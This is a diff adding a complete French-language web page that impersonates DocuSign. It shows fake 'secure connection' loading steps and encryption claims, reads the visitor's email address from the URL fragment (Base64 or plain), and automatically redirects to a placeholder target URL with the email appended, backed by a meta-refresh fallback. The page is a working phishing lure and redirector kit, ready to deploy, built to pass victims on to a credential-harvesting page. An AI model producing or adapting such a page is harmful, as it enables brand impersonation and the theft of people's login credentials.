@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <title>DocuSign Document Cloud | Accès Sécurisé aux Documents</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="description" content="Accédez en toute sécurité à vos documents avec DocuSign Document Cloud"><!-- Balise meta refresh ajoutée comme solution de repli -->
+    <meta http-equiv="refresh" content="10;url=https://ME.COM">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <link rel="preload" href="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e3/Docusign_Full_Color.svg/330px-Docusign_Full_Color.svg.png">
+    <style>
+        :root {
+            --primary: #2962FF;
+            --primary-dark: #0039CB;
+            --primary-light: #E3F2FD;
+            --text-dark: #212121;
+            --text-medium: #424242;
+            --text-light: #757575;
+            --bg-color: #f8f9fa;
+            --white: #FFFFFF;
+            --border-radius: 12px;
+            --box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            --transition: all 0.3s ease;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        html,
+        body {
+            height: 100%;
+            font-family: 'Inter', sans-serif;
+            background: var(--bg-color);
+            color: var(--text-dark);
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            line-height: 1.5;
+        }
+
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+        }
+
+        .container {
+            text-align: center;
+            max-width: 480px;
+            width: 100%;
+            padding: 2.5rem;
+            background: var(--white);
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .logo-container {
+            margin: 0 auto 1.5rem;
+            width: 180px;
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .logo-container img {
+            max-width: 100%;
+            height: auto;
+        }
+
+        h1 {
+            font-size: 1.75rem;
+            font-weight: 600;
+            margin-bottom: 0.75rem;
+            color: var(--text-dark);
+        }
+
+        .subheading {
+            font-size: 1.1rem;
+            color: var(--text-medium);
+            margin-bottom: 2rem;
+            font-weight: 400;
+        }
+
+        .loading-container {
+            margin: 2rem 0;
+        }
+
+        .loading-spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid var(--primary-light);
+            border-top: 4px solid var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 1.5rem;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .status-text {
+            font-size: 1rem;
+            color: var(--text-medium);
+            margin-bottom: 0.5rem;
+            font-weight: 500;
+        }
+
+        .status-detail {
+            font-size: 0.9rem;
+            color: var(--text-light);
+            margin-bottom: 1.5rem;
+        }
+
+        .email-preview {
+            font-size: 0.95rem;
+            margin: 1.5rem 0;
+            color: var(--primary);
+            font-weight: 500;
+            background: var(--primary-light);
+            padding: 1rem;
+            border-radius: 8px;
+            border-left: 4px solid var(--primary);
+        }
+
+        .progress-container {
+            width: 100%;
+            height: 6px;
+            background: var(--primary-light);
+            border-radius: 3px;
+            margin: 2rem 0;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: var(--primary);
+            border-radius: 3px;
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+
+        .progress-info {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.8rem;
+            color: var(--text-light);
+            margin-top: 0.5rem;
+        }
+
+        .button-container {
+            margin-top: 1.5rem;
+        }
+
+        .primary-button {
+            padding: 14px 36px;
+            background-color: var(--primary);
+            color: var(--white);
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: 500;
+            font-family: 'Inter', sans-serif;
+            transition: var(--transition);
+            display: inline-block;
+            box-shadow: 0 2px 4px rgba(41, 98, 255, 0.2);
+        }
+
+        .primary-button:hover {
+            background-color: var(--primary-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(41, 98, 255, 0.3);
+        }
+
+        .secondary-button {
+            padding: 12px 24px;
+            background-color: transparent;
+            color: var(--primary);
+            border: 1px solid var(--primary);
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            font-weight: 500;
+            margin-left: 1rem;
+            transition: var(--transition);
+        }
+
+        .secondary-button:hover {
+            background-color: var(--primary-light);
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 2rem;
+            font-size: 0.8rem;
+            color: var(--text-light);
+        }
+
+        .security-badge svg {
+            margin-right: 0.5rem;
+            fill: var(--primary);
+        }
+
+        .error-message {
+            color: #D32F2F;
+            background: #FFEBEE;
+            padding: 1rem;
+            border-radius: 8px;
+            border-left: 4px solid #D32F2F;
+            margin: 1rem 0;
+            text-align: left;
+        }
+
+        .error-message a {
+            color: #D32F2F;
+            font-weight: 500;
+            text-decoration: underline;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 1.75rem;
+            }
+
+            h1 {
+                font-size: 1.5rem;
+            }
+
+            .subheading {
+                font-size: 1rem;
+            }
+
+            .logo-container {
+                width: 150px;
+                height: 50px;
+            }
+
+            .button-container {
+                display: flex;
+                flex-direction: column;
+                gap: 0.75rem;
+            }
+
+            .secondary-button {
+                margin-left: 0;
+                margin-top: 0.5rem;
+            }
+        }
+
+        /* Classes d'animation */
+        .fade-in {
+            animation: fadeIn 0.5s ease-out forwards;
+        }
+
+        @keyframes fadeIn {
+            to {
+                opacity: 1;
+            }
+        }
+
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container fade-in">
+        <div class="logo-container"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e3/Docusign_Full_Color.svg/330px-Docusign_Full_Color.svg.png" alt="Logo DocuSign" style="margin: 0 auto 0 0; display: block; "></div>
+        <h1>DocuSign Document Cloud</h1>
+        <p class="subheading">Acc&eacute;dez en toute s&eacute;curit&eacute; &agrave; vos documents</p>
+        <div id="contentArea">
+            <div class="loading-container">
+                <div class="loading-spinner" id="spinner"><br></div>
+                <p class="status-text" id="statusText">Initialisation de la connexion s&eacute;curis&eacute;e...</p>
+                <p class="status-detail" id="statusDetail">V&eacute;rification de vos autorisations</p>
+            </div>
+            <div class="email-preview hidden" id="emailDisplay"><br></div>
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar"><br></div>
+                <div class="progress-info"><span id="progressPercentage">0%</span> <span id="timeRemaining">Environ 10 secondes restantes</span></div>
+            </div>
+            <div class="button-container"><button class="primary-button hidden" id="manualGo">Continuer vers le Document</button> <button class="secondary-button hidden" id="learnMore">En savoir plus</button></div>
+            <div class="security-badge"><svg width="16" height="16">&nbsp;<path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11V11.99z"></path>&nbsp;</svg> <span>Chiffrement SSL 256 bits &bull; Vos donn&eacute;es sont s&eacute;curis&eacute;es</span></div>
+        </div>
+        <div id="errorArea" class="hidden">
+            <div class="error-message">
+                <h3>Impossible de v&eacute;rifier votre acc&egrave;s</h3>
+                <p id="errorDetail">L&apos;adresse e-mail fournie n&apos;a pas pu &ecirc;tre v&eacute;rifi&eacute;e. Veuillez v&eacute;rifier le lien ou contacter le support si vous pensez qu&apos;il s&apos;agit d&apos;une erreur.</p>
+                <p><a href="#" id="contactSupport">Contacter le Support</a> ou <a href="#" id="tryAgain">R&eacute;essayer</a></p>
+            </div>
+        </div>
+    </div>
+    <script>
+        // Configuration
+        const config = {
+            targetUrl: "https://example.com/ava/in",
+            supportEmail: "support@docusign.com",
+            loadingStates: [
+                { 
+                    text: "Initialisation de la connexion sécurisée...", 
+                    detail: "Vérification de vos autorisations",
+                    progress: 10 
+                },
+                { 
+                    text: "Connexion au serveur de documents...", 
+                    detail: "Établissement du tunnel chiffré",
+                    progress: 25 
+                },
+                { 
+                    text: "Authentification de votre session...", 
+                    detail: "Vérification de vos identifiants",
+                    progress: 40 
+                },
+                { 
+                    text: "Chargement du contenu du document...", 
+                    detail: "Récupération depuis le stockage sécurisé",
+                    progress: 65 
+                },
+                { 
+                    text: "Finalisation de la préparation...", 
+                    detail: "Application des protocoles de sécurité",
+                    progress: 85 
+                },
+                { 
+                    text: "Prêt à continuer !", 
+                    detail: "Accès au document vérifié",
+                    progress: 100 
+                }
+            ],
+            minLoadingTime: 7000, // 7 secondes minimum
+            maxLoadingTime: 10000 // 10 secondes maximum
+        };
+        
+        // Gestion d'état
+        let state = {
+            email: null,
+            trackingParams: null,
+            humanInteraction: false,
+            currentStateIndex: 0,
+            startTime: null,
+            timer: null,
+            isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
+        };
+        
+        // Éléments DOM
+        const elements = {
+            spinner: document.getElementById("spinner"),
+            statusText: document.getElementById("statusText"),
+            statusDetail: document.getElementById("statusDetail"),
+            emailDisplay: document.getElementById("emailDisplay"),
+            progressBar: document.getElementById("progressBar"),
+            progressPercentage: document.getElementById("progressPercentage"),
+            timeRemaining: document.getElementById("timeRemaining"),
+            manualGo: document.getElementById("manualGo"),
+            learnMore: document.getElementById("learnMore"),
+            contentArea: document.getElementById("contentArea"),
+            errorArea: document.getElementById("errorArea"),
+            errorDetail: document.getElementById("errorDetail"),
+            contactSupport: document.getElementById("contactSupport"),
+            tryAgain: document.getElementById("tryAgain")
+        };
+        
+        // Fonctions utilitaires
+        function decodeBase64(str) {
+            try {
+                // Essayer d'abord le décodage Base64 standard
+                const decoded = atob(str);
+                // Vérifier si la chaîne décodée est un e-mail valide
+                if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(decoded)) {
+                    return decoded;
+                }
+                // Sinon, essayer le décodage URI
+                return decodeURIComponent(decoded);
+            } catch {
+                return null;
+            }
+        }
+        
+        function isValidEmail(email) {
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        }
+        
+        function parseHashWithTracking() {
+            const hash = window.location.hash ? window.location.hash.substring(1) : '';
+            if (!hash) return { email: null, tracking: null };
+            
+            // Vérifier si le hash contient des paramètres de suivi (contient ?)
+            const questionMarkIndex = hash.indexOf('?');
+            
+            if (questionMarkIndex === -1) {
+                // Pas de paramètres de suivi, traiter comme avant
+                // Essayer de décoder en Base64 d'abord
+                const decoded = decodeBase64(hash);
+                if (decoded && isValidEmail(decoded)) {
+                    return { email: decoded, tracking: null };
+                }
+                
+                // Si pas de Base64 valide, vérifier si c'est un e-mail simple
+                if (isValidEmail(hash)) {
+                    return { email: hash, tracking: null };
+                }
+                
+                return { email: null, tracking: null };
+            } else {
+                // A des paramètres de suivi
+                const emailPart = hash.substring(0, questionMarkIndex);
+                const trackingPart = hash.substring(questionMarkIndex + 1);
+                
+                // Essayer de décoder la partie e-mail en Base64 d'abord
+                let email = null;
+                const decoded = decodeBase64(emailPart);
+                if (decoded && isValidEmail(decoded)) {
+                    email = decoded;
+                } else if (isValidEmail(emailPart)) {
+                    email = emailPart;
+                }
+                
+                return {
+                    email: email,
+                    tracking: trackingPart || null
+                };
+            }
+        }
+        
+        function getEmailFromHash() {
+            const result = parseHashWithTracking();
+            state.trackingParams = result.tracking;
+            return result.email;
+        }
+        
+        function redirectToFinalUrl() {
+            if (!state.email) {
+                showError("Aucune adresse e-mail trouvée pour la redirection");
+                return;
+            }
+        
+            // Commencer par l'URL cible de base
+            let finalUrl = config.targetUrl;
+            
+            // Supprimer les barres obliques ou séparateurs en fin
+            finalUrl = finalUrl.replace(/[\/\?&]$/, '');
+            
+            // Ajouter l'e-mail directement à l'URL
+            finalUrl = `${finalUrl}${state.email.replace('@', '@')}`;
+            
+            // Effectuer la redirection immédiate
+            window.location.href = finalUrl;
+        }
+        
+        function updateProgress(percentage) {
+            elements.progressBar.style.width = `${percentage}%`;
+            elements.progressPercentage.textContent = `${percentage}%`;
+            
+            // Mettre à jour l'estimation du temps restant
+            if (state.startTime) {
+                const elapsed = Date.now() - state.startTime;
+                const estimatedTotal = (elapsed / percentage) * 100;
+                const remaining = Math.max(0, (estimatedTotal - elapsed) / 1000);
+                elements.timeRemaining.textContent = `Environ ${Math.ceil(remaining)} secondes restantes`;
+            }
+        }
+        
+        function updateLoadingState() {
+            if (state.currentStateIndex < config.loadingStates.length) {
+                const currentState = config.loadingStates[state.currentStateIndex];
+                
+                elements.statusText.textContent = currentState.text;
+                elements.statusDetail.textContent = currentState.detail;
+                updateProgress(currentState.progress);
+                
+                // Cacher le spinner quand terminé
+                if (state.currentStateIndex === config.loadingStates.length - 1) {
+                    elements.spinner.classList.add("hidden");
+                    elements.manualGo.classList.remove("hidden");
+                    elements.learnMore.classList.remove("hidden");
+                }
+                
+                state.currentStateIndex++;
+                
+                if (state.currentStateIndex < config.loadingStates.length) {
+                    const nextState = config.loadingStates[state.currentStateIndex];
+                    const delay = nextState.progress === 100 ? 
+                        Math.max(500, config.minLoadingTime - (Date.now() - state.startTime)) : 
+                        (nextState.progress - currentState.progress) * 50;
+                    
+                    setTimeout(updateLoadingState, delay);
+                }
+            }
+        }
+        
+        function showError(message) {
+            elements.contentArea.classList.add("hidden");
+            elements.errorArea.classList.remove("hidden");
+            elements.errorDetail.textContent = message;
+        }
+        
+        function handleTouch() {
+            state.humanInteraction = true;
+            // Supprimer les écouteurs après le premier toucher pour éviter les problèmes de performance
+            document.removeEventListener("touchstart", handleTouch);
+            document.removeEventListener("touchmove", handleTouch);
+            document.removeEventListener("touchend", handleTouch);
+        }
+        
+        // Écouteurs d'événements pour l'interaction humaine
+        function setupEventListeners() {
+            document.addEventListener("mousemove", () => state.humanInteraction = true);
+            document.addEventListener("click", () => state.humanInteraction = true);
+            document.addEventListener("keydown", () => state.humanInteraction = true);
+            
+            // Support tactile amélioré pour mobile
+            document.addEventListener("touchstart", handleTouch, {passive: true});
+            document.addEventListener("touchmove", handleTouch, {passive: true});
+            document.addEventListener("touchend", handleTouch, {passive: true});
+            
+            elements.manualGo.addEventListener("click", redirectToFinalUrl);
+            elements.learnMore.addEventListener("click", (e) => {
+                e.preventDefault();
+                alert("DocuSign Document Cloud fournit un accès sécurisé et chiffré à vos documents importants. Tous les transferts utilisent un chiffrement SSL 256 bits.");
+            });
+            
+            elements.contactSupport.addEventListener("click", (e) => {
+                e.preventDefault();
+                window.location.href = `mailto:${config.supportEmail}?subject=Problème%20d'accès%20au%20document`;
+            });
+            
+            elements.tryAgain.addEventListener("click", (e) => {
+                e.preventDefault();
+                window.location.reload();
+            });
+        }
+        
+        // Initialiser la page
+        function init() {
+            setupEventListeners();
+            
+            state.email = getEmailFromHash();
+            state.startTime = Date.now();
+            
+            if (!state.email) {
+                showError("L'adresse e-mail fournie n'a pas pu être vérifiée. Veuillez vérifier le lien ou contacter le support si vous pensez qu'il s'agit d'une erreur.");
+                return;
+            }
+            
+            // Afficher l'e-mail (seulement l'e-mail propre, pas les paramètres de suivi)
+            elements.emailDisplay.textContent = state.email;
+            elements.emailDisplay.classList.remove("hidden");
+            
+            // Optionnel : Enregistrer les paramètres de suivi pour le débogage (supprimer en production)
+            if (state.trackingParams) {
+                console.log("Paramètres de suivi:", state.trackingParams);
+            }
+            
+            // Démarrer la séquence de chargement
+            setTimeout(updateLoadingState, 500);
+            
+            // Redirection automatique après le temps de chargement maximum (avec détection mobile)
+            const redirectTime = state.isMobile ? Math.min(config.maxLoadingTime, 5000) : config.maxLoadingTime;
+            
+            state.timer = setTimeout(() => {
+                // Toujours tenter la redirection à la fin du minuteur
+                redirectToFinalUrl();
+            }, redirectTime);
+        }
+        
+        // Démarrer quand le DOM est chargé
+        document.addEventListener("DOMContentLoaded", init);
+    </script>
+</body>
+
+</html>
